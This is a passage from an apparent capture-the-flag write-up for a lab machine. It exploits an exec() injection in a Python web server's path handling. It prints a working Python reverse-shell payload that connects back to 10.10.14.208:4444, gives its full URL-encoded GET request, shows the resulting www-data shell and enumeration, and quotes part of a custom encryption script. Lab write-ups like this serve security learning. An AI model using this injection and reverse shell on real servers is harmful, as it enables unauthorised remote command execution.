&lt;span class="code-line"&gt;                &lt;span class="n"&gt;errorPage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;docRoot&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;errors&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;404.html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;mime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/html&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;errorPage&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;404&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;errorPage&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;docRoot&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;errors&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;500.html&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;mime&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;text/html&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;errorPage&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;500&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;body&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;mime&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;mime&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;status&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The script is a bit long but we can see the line
&lt;code&gt;exec(info.format(path))&lt;/code&gt; where &lt;code&gt;path&lt;/code&gt; is the user input (the path in a GET
request). The use of the &lt;code&gt;exec()&lt;/code&gt; function is dangerous as
&lt;code&gt;exec(os.system(&amp;lt;cmd&amp;gt;))&lt;/code&gt; will execute the command on the system (if &lt;code&gt;os&lt;/code&gt; is
imported).&lt;/p&gt;
&lt;p&gt;Here there is some python before the &lt;code&gt;exec()&lt;/code&gt;:
&lt;code&gt;info = "output = 'Document: {}'"&lt;/code&gt; so we need to "escape" this string. We try a
few thing on our system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; path = &amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; exec(info.format(path))&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; path = &amp;quot;test&amp;#39;; print(&amp;#39;boom&amp;#39;); &amp;#39;test&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;gt;&amp;gt;&amp;gt; exec(info.format(path))&lt;/span&gt;
&lt;span class="code-line"&gt;boom&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So we can insert some payload between the two &lt;code&gt;;&lt;/code&gt;. As the server is running
python we will use the &lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python"&gt;python TCP reverse
shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So our payload is: &lt;code&gt;test'; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.208",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");'test&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We get a error 400 "Bad request", so we encode our payload with Burp (url encode
all characters). The payload look like the following in burp repeater (yes I
also encoded the first &lt;code&gt;/&lt;/code&gt; which is not part of our payload):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET %2f%74%65%73%74%27%3b%20%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%30%2e%31%30%2e%31%34%2e%32%30%38%22%2c%34%34%34%34%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%69%6d%70%6f%72%74%20%70%74%79%3b%20%70%74%79%2e%73%70%61%77%6e%28%22%2f%62%69%6e%2f%62%61%73%68%22%29%3b%27%74%65%73%74 HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Host: 10.10.10.168:8080&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;This give us a reverse shell as &lt;code&gt;www-data&lt;/code&gt;. We start enumerating the box and
found interesting files in the &lt;code&gt;robert&lt;/code&gt; home folder.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;www-data@obscure:/$ id&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@obscure:/$ ls /home/&lt;/span&gt;
&lt;span class="code-line"&gt;ls /home/&lt;/span&gt;
&lt;span class="code-line"&gt;robert&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@obscure:/$ ls /home/robert/&lt;/span&gt;
&lt;span class="code-line"&gt;ls /home/robert/&lt;/span&gt;
&lt;span class="code-line"&gt;BetterSSH  enum     passwordreminder.txt  user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;check.txt  out.txt  SuperSecureCrypt.py&lt;/span&gt;
&lt;span class="code-line"&gt;www-data@obscure:/$ ls /home/robert/BetterSSH/&lt;/span&gt;
&lt;span class="code-line"&gt;ls /home/robert/BetterSSH/&lt;/span&gt;
&lt;span class="code-line"&gt;BetterSSH.py&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We get the SuperSecureCrypt.py file (&lt;em&gt;I also get the BetterSSH.py file but it
will be used later&lt;/em&gt;).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;argparse&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;keylen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyChr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;keyPos&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;newChr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;newChr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;newChr&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyChr&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;newChr&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;keylen&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;keylen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;decrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyChr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;keyPos&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;newChr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;newChr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;newChr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;keyChr&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;decrypted&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;newChr&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;keyPos&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;keylen&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;decrypted&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argparse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ArgumentParser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Encrypt with 0bscura&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;&lt;/span&gt;&lt;span class="s1"&gt;s encryption algorithm&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-i&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;InFile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;The file to read&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;required&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-o&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;OutFile&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Where to output the encrypted/decrypted file&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;required&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-k&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;metavar&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Key to use&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;required&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-d&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;action&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;store_true&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Decrypt mode&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_args&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;banner&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;################################&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;#           BEGINNING          #&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;#    SUPER SECURE ENCRYPTOR    #&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;################################&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;banner&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  ############################&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;banner&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  #        FILE MODE         #&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;banner&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;  ############################&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;banner&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="kc"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Missing args&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
